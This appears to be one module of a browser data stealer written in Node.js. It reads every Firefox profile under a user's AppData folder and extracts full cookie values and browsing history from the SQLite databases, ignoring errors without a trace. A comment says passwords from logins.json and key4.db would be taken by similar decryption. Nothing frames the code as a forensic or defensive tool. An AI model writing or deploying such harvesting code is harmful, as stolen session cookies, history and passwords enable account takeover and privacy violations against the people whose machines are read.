const path = require('path');
const fs = require('fs');
const { querySQLiteDatabase, QUERY_FIREFOX_COOKIES } = require('./database');

/**
 * SQL Query to extract browsing history from Firefox's moz_places table.
 */
const HISTORY_QUERY = `
    SELECT url, title, visit_count, last_visit_date 
    FROM moz_places 
    WHERE visit_count > 0 
    ORDER BY last_visit_date DESC
`;

/**
 * Extracts browser data (cookies, history, bookmarks, and passwords) from Mozilla Firefox profiles.
 * @param {string} appDataPath - The base AppData path for the user.
 * @param {object} config - Extraction parameters like maxHistory or maxProfiles.
 * @returns {Promise<object>} An object containing arrays of extracted data.
 */
async function extractFirefoxData(appDataPath, config = {}) {
    const results = {
        cookies: [],
        history: [],
        bookmarks: [],
        passwords: []
    };

    try {
        // Base directory for Firefox profiles
        const firefoxProfilesPath = path.join(appDataPath, "Mozilla", "Firefox", "Profiles");
        if (!fs.existsSync(firefoxProfilesPath)) {
            return results;
        }

        const profiles = fs.readdirSync(firefoxProfilesPath);
        let profileCount = 0;

        for (const profileName of profiles) {
            // Apply profile limit if configured
            if (config.maxProfiles && profileCount >= config.maxProfiles) break;
            
            const profilePath = path.join(firefoxProfilesPath, profileName);
            
            // --- Extract Cookies ---
            const cookiesDbPath = path.join(profilePath, "cookies.sqlite");
            if (fs.existsSync(cookiesDbPath)) {
                try {
                    const cookieEntries = await querySQLiteDatabase(cookiesDbPath, QUERY_FIREFOX_COOKIES);
                    for (const cookie of cookieEntries) {
                        results.cookies.push({
                            host: cookie.host,
                            name: cookie.name,
                            path: cookie.path,
                            value: cookie.value,
                            isSecure: cookie.isSecure === 1,
                            isHttpOnly: cookie.isHttpOnly === 1,
                            expires: cookie.expiry ? new Date(cookie.expiry * 1000).toISOString() : null
                        });
                    }
                } catch (e) {
                    // Fail silently for individual profile errors
                }
            }

            // --- Extract Browsing History ---
            const historyDbPath = path.join(profilePath, "places.sqlite");
            if (fs.existsSync(historyDbPath)) {
                try {
                    const historyEntries = await querySQLiteDatabase(historyDbPath, HISTORY_QUERY);
                    let currentHistCount = 0;
                    for (const entry of historyEntries) {
                        if (config.maxHistory && currentHistCount >= config.maxHistory) break;
                        
                        results.history.push({
                            url: entry.url,
                            title: entry.title,
                            visitCount: entry.visit_count,
                            // Firefox stores timestamps in microseconds
                            lastVisit: entry.last_visit_date ? new Date(entry.last_visit_date / 1000).toISOString() : null
                        });
                        currentHistCount++;
                    }
                } catch (e) {
                    // Fail silently
                }
            }

            // --- Note: Bookmarks and Passwords ---
            // These would normally be read from places.sqlite (bookmarks) 
            // and logins.json/key4.db (passwords) using similar query or decryption patterns.
            
            profileCount++;
        }
    } catch (err) {
        // Main extraction loop error handling
    }

    return results;
}

module.exports = {
    extractFirefoxData
};